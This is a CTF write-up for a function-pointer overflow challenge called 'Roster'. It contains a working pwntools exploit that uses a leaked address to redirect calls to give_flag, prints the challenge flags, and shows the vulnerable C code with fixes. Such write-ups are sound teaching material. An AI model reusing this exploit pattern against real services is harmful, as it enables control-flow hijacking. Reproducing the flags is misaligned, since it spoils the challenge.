# Roster

**Author:** John_x9  
**Difficulty:** Medium  
**Connect:** `nc 167.86.100.57:9004`

NUST club roster on the lab projector. Someone left a debug line: `print_student@0x...`. That leak is the gift. Overflow a short name into the adjacent function pointer, call `show`, and hit `give_flag` (not the decoy `win`).

---

## Blind solve path

### 1. Connect

```bash
nc 167.86.100.57 9004
```

```text
NUST Club Roster
print_student@0x40131b (debug leftover)
1 add
2 show
3 edit
4 quit
>
```

Menus: add, show, edit, quit. Indices `0`..`3`.

### 2. Note the leak

`print_student@0x...` proves **no-PIE**. The address is stable across reconnects for this build. It is your code anchor. This challenge is friendlier than pure-blind: the wire prints a code pointer.

### 3. Happy path

1. Choose `1` (add), index `0`.
2. Short name `alice`, short club `pwn`.
3. Choose `2` (show), index `0`.

Clean `name=... club=...` line.

### 4. Discover the overflow

Add or edit with a **long** name (48-64 bytes of `A`), then `show`. Crash or disconnect instead of a clean print means the name write is larger than `name[32]` and hits an adjacent function pointer used by `show`.

Inferred layout:

```text
name[32] | printme fnptr | club[...]
```

Overwrite `printme`, then trigger `show`.

### 5. Decoy

Point the fnptr at decoy `win` (near the leak: `print_student + 0x36` → `0x401351` on this build) and you get:

```text
nustCTF{w1n_1s_4_d3c0y_ch3ck_4g41n}
wrong win. john_x9
```

Trap. Real opener is `give_flag`.

### 6. Finding `give_flag` from the leak

1. Parse `print_student@0x40131b` from the banner.
2. On this build: **`give_flag = print_student + 0x5f`** → `0x40137a`.

If organizers hand you the binary, symbols give the same number. The printed `@` still confirms you are on the matching build.

| Piece | Address / delta |
|-------|-----------------|
| `print_student` (leaked) | `0x40131b` (example) |
| `give_flag` | leak `+ 0x5f` → `0x40137a` |
| decoy `win` | leak `+ 0x36` → do not use |

### 7. Working remote script

```python
#!/usr/bin/env python3
from pwn import *
import re

HOST = '167.86.100.57'
PORT = 9004

context.log_level = 'error'
io = remote(HOST, PORT)
banner = io.recvuntil(b'> ')

m = re.search(rb'print_student@(0x[0-9a-fA-F]+)', banner)
print_student = int(m.group(1), 16)
give_flag = print_student + 0x5f   # or hardcode 0x40137a

io.sendline(b'1')
io.sendlineafter(b'idx>', b'0')
io.sendafter(b'name>', b'A' * 32 + p64(give_flag))
io.sendlineafter(b'club>', b'x')

io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'idx>', b'0')
print(io.recvall(timeout=2).decode(errors='ignore'))
```

Same script: [`solves/04-roster-solve.py`](solves/04-roster-solve.py).

---

## Real flag

```text
nustCTF{r0st3r_fnptr_0v3rfl0w}
```

---

## After the event: vulnerable code and how to fix

Vulnerable pattern (illustrative):

```c
typedef struct Student {
  char name[32];
  void (*printme)(struct Student *);
  char club[16];
} Student;

void do_add(void){
  /* ... */
  s->printme = print_student;
  printf("name> ");
  read(0, s->name, 64);   /* 64 into name[32]: smashes printme */
  /* ... */
}

void do_show(void){
  /* ... */
  slot[i]->printme(slot[i]);
}
```

Name and function pointer are adjacent. Oversized `read` into `name` overwrites `printme`. `do_edit` has the same bug. The banner also leaks `print_student`.

**Secure coding fixes:**

1. Bound reads: `read(0, s->name, sizeof(s->name) - 1)` and NUL-terminate.
2. Do not place function pointers immediately after attacker-writable buffers; separate them or make the dispatch table immutable / index-based.
3. Remove debug address prints from production banners.
4. After allocation, consider making the function pointer `const` in design terms: only set once from a trusted table, never adjacent to unbounded copies.
